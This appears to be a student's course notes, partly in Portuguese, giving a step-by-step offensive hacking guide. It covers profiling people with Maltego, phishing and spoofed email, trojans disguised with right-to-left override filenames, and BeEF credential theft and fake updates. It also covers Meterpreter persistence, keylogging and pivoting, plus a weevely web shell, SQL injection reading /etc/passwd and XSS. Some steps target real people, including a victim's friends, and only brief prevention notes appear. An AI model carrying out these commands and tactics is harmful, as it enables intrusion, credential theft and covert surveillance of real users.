The methods used so far on client side attacks don't really require that the user do something, the problem is that we need to be the Man in the middle and this is not always possible. So another option is to help the user help. Social engineering is a big area, that has various attacks, that vary from some that don't even need technical knowledge and some that need.

  

Steps

1. Gather the user information: their friends, places that go, things that likes, etc
    
2. Build strategy based on the information
    
3. Build a backdoor based on the information
    

  

Maltego is an information gathering tool that is going to be used a lot. It can gather information about people, companies, numbers, websites, etc. 

- Open the maltego tool on the Kali machine
    
- On the main page(after login) you are going to see transformers that are plugins that are used to gather information about specific things
    
- Go to the corner and click on new graph, It will appear the main work space on maltego
    
- Na esquerda nós temos as entidades, que você pode arrastar para o graph. You can change the information about the entidad on properties, right click on the entidade para escolher tipo the information to gather.
    
- After running, double click on the results to see more information
    
- Now you can explore what was found to elaborate an extrategy
    
- You can go to entities and manage entities to access all entities that maltego has to offer, like twitter
    
- There is a lot of try and error on this, you try and delete the entities that doesn't have anything useful and keep doing
    

  

How to build a strategy: 

- You can see what sites the target uses and pretend to be someone from there and send an .exe file if appropriate/convincing. Or you can send a link that says that is going to reset their password, then send them to a page exactly like the original and capture their new password.

- You can pass for a friend sending an email, so you can send an image, a pdf, etc

- If other options fail, you can hack the computer of the friends of the target and send a message by their facebook/other social media

  

Manipulate files

You can use the Backdoor created before so it appears to be an image, PDF etc. Something that the target is interested in, so you can social engineer them to give you access

To do this we are going to use a download and execute script. It will download and execute the file that the person expects and download and execute the Backdoor on the background

- Download the script from the resources
    
- Open the script and change the url to what the target expects. Use a , and put the direct url to the backdoor
    

  

How to compile to a executable and change icon

- The language autoit of the script is installed with veil
    
- Rename the script file to name.au3
    
- Search on the computer for the compiler of script autoit. Put the script and change the icon(ir has to be an .ico). Click on convert
    
- To the target, you send the .exe file
    
- Put the file on the webserver
    
- Listen for incoming connections
    
-   
    
- To test, go to the windows machine and go to the webserver to make download of the file and execute
    
- On the terminator the menterpeter session should be started
    

  

The only problem is that the file has the .exe. On some computers, Windows will hide It, but if not, it is suspicious. How to change?

- You get the extension and put reversed on the name. Example testegnp.exe to use png. You need to put a character that is going to invert the text
    
- Go on all application - character - search right left override - paste on the name of file
    
- test<character>gnp.exe -> testexe.png
    
- Think of a name that ends with exe
    
- Before sending to the target, compress because some browsers are deleting the character when doing download
    

  

Spoofing emails

Deliver trojan by email that looks that came from an address of a friend, as example

The easier way of doing this is going to Google and searching for spoof email, there will be sites to do it, but their email may appear to be spam to the target because they are used a lot for spamming.

Another option is to use a free server, or one webserver you brought. Even better if you use a mail server like sendinblue, because those are used by actual companies and don't send spams, good reputation, and they have a free plan. On sendinblue you will have everything needed to use the SMTP server.

- Create account on sendinblue
    
- Open terminator
    
- sendemail --help
    
- sendemail -xu <user name given by sendinblue> -xp <the password> -s <server:port> -f "<email that you want to appear>" -t "<target email>" -u "<email title>" -m "<email message. Add a link to the target download your file. Like a link to Google drive, per example>" -o message-header="From: <name of the sender<email>>"
    
- Now you should be listening to incoming connections to wait for the target to install your trojan
    

  

Another way of doing this, is using a web hosting and again, you will have better results with the paid ones

  

BeEF Framework

Browser exploitation framework, it allows you to launch a number of attacks on a hooked target. The target is hooked when clicks on a hook link. It comes with Kali.

- Search on the tools and click on BeEF start
    
- The first time, will ask for password
    
- After will open the web interface. The default user is beef 
    
- To hook you have to make the Browser execute a certain javascript code. BeEF gives you the code and when is executed, the browser will appear on the left of the beef web interface.
    
- When the target is hooked, you can show fake history, fake updates or even gain access to the target computer
    
- To stop BeEF you go to all applications, look for BeEF and click on BeEF stop
    

  

A better way of doing this if you can intercept connections. We learned that if you can become the MITM you can inject javascript code on the target browser. The hook is js code, so you can use the same technique. The code is in the resources of the lecture, just change to your ip.

On the hstshijack file to do the injection, put a <,> and add the location of the new code. Don't delete the older one.

  

Running basic commands

- Go to BeEF web interface and select a hooked browser. 
    
- It will show the options commands. There will be multiple commands that do gathering of information, social engineer or give you Full Control of you target computer
    
- Click on the module you want and click on execute
    
- One module is raw javascript, you can use any javascript code. Look for useful code on Google
    
- Another useful module is redirect browser so you can redirect the user to any page. You can use to say that the target needs to download an update or something like that
    
- Social engineer tatic to steal passwords. This method is to say to the target that he got logged out of his session and to log again. This will bypass http, https and hsts. The command is called pretty theft, you can select what social media to use. A little window will appear to the target, and the infos that they type will be saved
    
- How to gain full control of the target computer. There are a number of commands you can use, one of the Fake notification bar, that will tell the user that there is a new update or plugin to install that will have a backdoor(you can use the same that was made before, just change the name to update or something). On the BeEF interface of the command, put the address of the backdoor and in text put something like "Critical update to Firefox, click to install". You should be listening for incoming connections
    

OBS: The target will click to download and will have to click on the downloaded file to install because is a executable

  

How to detect trojans manually

-You can see if a file is what says it is by going in properties

- Go to a windows tool called resources manager, it can show all the ports being used. You can put the address on the browser, if is a hacker it will not take you to a site. To do this you can use a tool called reverse DNS, it will show what server that ip belongs

- Another way of discovering trojans is to use a sandbox. It will run your file and analizy it if is going to do something suspicious. Google sandbox online to find. Example is payload security

  
  

All of this attacks with BeEF and backdoors attack and server side attacks, but you need to configure your network to accept the incoming connections. Configure your router to handle incoming connections directed to the kali machine

  

OBS: On a system, each device has an ip, but It is an intern ip that is not visible on the internet. The router has one intern ip and one that is going to be used on the internet. When you make requests to the internet with a cellphone, the public ip of the router is used(because what really makes the request is the router)

Keep this in mind if you want to attack someone who is not in the same network as you.

  

To know which is your router ip, google it what is my ip. You use this ip on the Backdoor, but like this the incoming connection will go to the router and the router is not listening for anything, so make sure to configure the router to forward requests on the port you are listening on to the kali machine. How to configure the router to do this?

- Get the number of the local ip address of the router
    
- Put this number on the browser bar, it will open the configuration screen
    
- The user and password probably will be on a sticker on the router
    
- Look for something like ip forwarding or virtual network. It can variate.
    
- Put the port used and the ip from the Kali machine, where the connection will be redirected
    
- Make a rule of connection to the port where is webserver so is possible to download the backdoor(if you are using that method. If you send the Backdoor by email or something is not necessary)
    

  

Post exploitation

  

Regardless of how you got the access to the computador, now these are techniques to maintain the access and do things in the computer as access the webcam, get what keys on the keyboard are being typed and even use the target computer to hack other computers in the same network.

  

*All the action from now on will start from a meterpreter session on Terminator, the target computer already connected.

  

Menterpeter basics

help - this command will show all other commands and its functionalities

background - backgrounds the session. Like minimizing a window. You can run other commands while still maintaining the connection with the target

sessions -l - lists the active sessions

sessions -i <id of session> -Start the interaction with a session that was being backgrounded

sysinfo - show the information about the target computer

ipconfig - show all the interfaces connected to the target computer. Like the networks connected and etc

ps - shows all the processes running on the target computer, background processes or programs. You see the name and the id of process. A good ideia when you are hacking is to migrate the process you're running on to another process that is safer. explorer.exe is windows interface, is always running. If you gained access through an executable, the process will be stoped once the user closes the program

migrate 2116(per example) -move our session to another process. It will also look less suspicius

  

File system commands

pwd - gets the current directory

ls - list docs inside that directory

cd - enter, navigate the directories

cat example.txt - read file

download example.txt - download a file on the Kali machine

upload test.exe - you upload a file to the target computer. You can upload a backdoor, per example

execute -f backdoor.exe - execute a file

shell - It makes so you can execute like windows commands in another channel

  

There are a lot of other commands, research it if necessary.

  

Maintain connection 

Until now, we would lose connection with the target computer as soon as it is reinitiated because the process of the backdoor will be terminated.

How to maintain the connection? There are some methods

  

Using veil-evasion

- Use the reverse Shell and make upload and execute on the target computer (Rev_http_service ou Rev_tcp_service). Like this, every time that the computer is iniated, it will try to connect back with you.
    

*Does't always work

  

Using a module that comes with menterpeter

- On the menterpeter session
    
- run persistence -h //see options
    
- run persistence -U <connect like user> -i 20 <vai tentar se connectar comigo a cada 20 segundos> -p 80 <port> -r 10.20.14.203 <my ip>
    
- To receive the connection you have to be using the multihandler
    

*Detectable by antivirus programs

  

//Maintaining access in a way that is not going to be detectable. Use a backdoor that is going to be treated like a service and so it will be executed every time the user starts the computer.

//After the previous steps

- background
    
- use exploit/windows/local/persistence
    
- show options
    
- set EXE.NAME browser.exe <Here is the name that will appear on the processes, like this is less suspicious>
    
- set SESSION 1 <Select session where is the target>
    
- show advanced
    
- set EXE::Custom /var/www/html/backdoor.exe <Payload that is going to be injected>
    
- show advanced
    
- exploit
    
- sessions -K //Kill all sessions to test the reconnection 
    
- use exploit/multi/handler 
    
- exploit // If everything is correct this will reconnect with the target computer because we already made an injection 
    

When it works, it will give you a link that can be used to clean the target computer

  

Log all mouse and keyboard events

- Open connected session with meterpreter
    
- keyscan_start
    
- keyscan_dump
    
- keyscan_stop
    
- screenshot // Takes a screenshot
    

  

Pivoting

Use a hacked device as a pivot to access other devices in the network. An example is when you connect to a target and the other device you want to access is in another network and you don’t know their IP.

To test

- Go to virtual box and create another NAT network clicking on the plus symbol
    
- Change the CIDR and name
    
- Connect the first target - the window machine - to both networks
    
- Connect the Kali to one network and the other device to the other
    
- To verify if everything is set correctly, the windows machine should be able to ping both the other machines
    
- Now you just need to upload the needed files from the kali machine to the windows machine and from there execute the commands on the terminal as shown previously to attack the other device
    

  

But how to set a route between the hacked computer and your computer so you can use any module on the new devices? To do this, you use a module called autoroute

- ifconfig //Find one with the ip of the network the target computer is using
    
- background
    
- use post/windows/manage/autoroute
    
- show options
    
- set SESSION 1
    
- set SUBNET <The ip you found before, but without the last digit you change to .0>
    
- exploit //This will create the router/connection between my computer and the target using the hacked window machine. Now you can attack the target
    
- use exploit/multi/samba/usermap_script
    
- show option //Set things as shown previously
    
- exploit //You can just upload thing through the hacked machine, but using a router like this is safer
    

  

Website Hacking

A website is basically a program installed on a computer, the web application is executed on a computer called server and not on the client machine. You make a request from the client machine, this request will be translated using a DNS server to the IP address where that domain(facebook.com per example) is stored on the server. It will go to that IP and execute the page that you wanted and will give you back the ready html to be visualised. So if you send a script(On PHP or Python as example), it will be executed on the server and not on your machine. Because JavaScript is client side language, you can execute things on the client side, like to the people that access that page.

How to attack a website? Firstly, you can use methods used until now because a website is installed on a computer. You can hack their administrators and get the user and password or use server side attacks.

  

During the following examples the target will be the metasploitable. if you put the ip of the metaplitable machine on the browser it will show the link to some website you can use as a training(Set security to low).

  

Information gathering

- First, you can use the tools used before like maltego
    
- Use whois.domaintools.com to discover the information of the owner and infos about the server 
    
- To discover the technologies being used by a site, you can go to netcraft
    
- To get Comprehensive DNS Information, use Robtex
    

  

One server can serve multiple websites, so gaining access to one can help gaining access to others. 

- To know the other sites of a server you can go to bing search bar and put ip:<Site ip> or use Robotex “names pointing to the same ip”
    

  

To get information of subdomains, that sometimes are given to employees or especial clients and are not advertised, is interesting because is more common to find vulnerabilities in them.

1. Open Terminador
    
2. git clone [https://github.com/guelfoweb/knock.git](https://github.com/guelfoweb/knock.git)
    
3. cd knock/knockpy
    
4. python knockpy.py <domain you want to target>
    

  

To find files, even the hidden ones

- Open Terminator
    
- man dirb //It works with brute force, you give names and it tells you if finds a file with that name
    
- dirb <url> //like this it uses a common list of names 
    

  

File Upload Vulnerabilities

If a site lets you upload files, like perfil photos, you can upload instead a php file. To do this, you can use a tool called weevely to create a payload/shell

//To test this, use DVWA ste available on the metasploitable machine

- Open Terminator
    
- weevely generate 123456<password> /root/shell.php<where to store the backdoor>
    
- Upload shell.php
    
- weevely <url of the uploaded file> <password> //To connect with the backdoor. Now you can execute any command
    
- uname -a
    

  

Code execution vulnerabilities

Allow an attacker to execute Operating system commands on the server. Always test input boxes to see if you can inject a command

  

Local file inclusion

Allow the attacker to read any file on the same server. Here you can explore the URL trying to navigate the directories and see if you find any sensitive information

If a server have a certain vulnerability that is a function called allow_URL or allow_url_fopen

  

How to PREVENT the attacks above

All of those vulnerabilities are created because of a functionality. 

1. Only allow safe files to be uploaded, check the file type and not the extension because this can be bypassed; 
    
2. Avoid functions where the user can execute code and check/filter input before the execution; Use static file inclusion
    
3. Disable dangerous functions like allow_fopen_include and the likes
    

  

SQL Injection

Can give you access to a database, so you can see sensitive data, read files outside of www root, get info and log as admin and upload files

Discovering SQL vulns in POST

- When you see a url with the?something=something that signs that is using POST, try to break it. Use ‘and’, ‘order by’, “‘” on the inputboxes
    
- You can see if a website has a sql vulnerability with per example a password input like 12345’ and 1=1# 
    
- And put 12345’ and 1=2#  to see if you get an error, so you can know that the page is executing your code
    
- When you discover the vulnerability, you can try different codes and see if you can access sensitive information
    
- you can, per example, load a file with the code union select null, load_file{‘etc/passwd’}, null, null, null
    

  

You can use also a tool to automate the SQL injection called SQLMap

- Open Terminator
    
- sqlmap -u “<url to be exploited with the POST parameters on it>”
    

  

How to prevent SQL injection? People commonly use filters, black list of commands and white list of commands, but this strategies can be bypassed. The best way is to 

- Use parameterized statements, separate data from sql code
    

Example:

->prepare(“Select * from accounts where username = ? ”)

->execute(array{‘admin’})

- Also give the less possible privilege to the users
    

  

XSS - Cross site scripting vulns

Allows attacker to inject JavaScript into a page, so the code is executed when pages loads. This attack affects the client machines and not the server. There are three types: Stored/persistent xss - is on the database and executed everytime the page loads; Reflected xss - will only be executed when the user clicks on a specific URL; DOM based - JavaScript code written on the client, what could be very dangerous because the server has security measures, but this type can avoid it.

- To find this vulnerability is very similar to SQL Injection, you find any URLs with POST parameters or input boxes and try to inject JS code
    
- Put something like <script>alert(“XML”) </script>
    
- To do stored xss attack, inject the JS code on the database, so it affects all the users that visit a page and try to per example retrieve info from that database
    

  

Exploiting XSS vulns

Use BeeF so people get hooked, you just have to inject the BeeF script on the database

  

Preventing xss attacks

- Escape any untrusted input before inserting on the page(Suspicious character are converted to a written equivalent like < become &It)
    

  

Zed Attack Proxy is a tool to find vulnerabilities on a web applications

**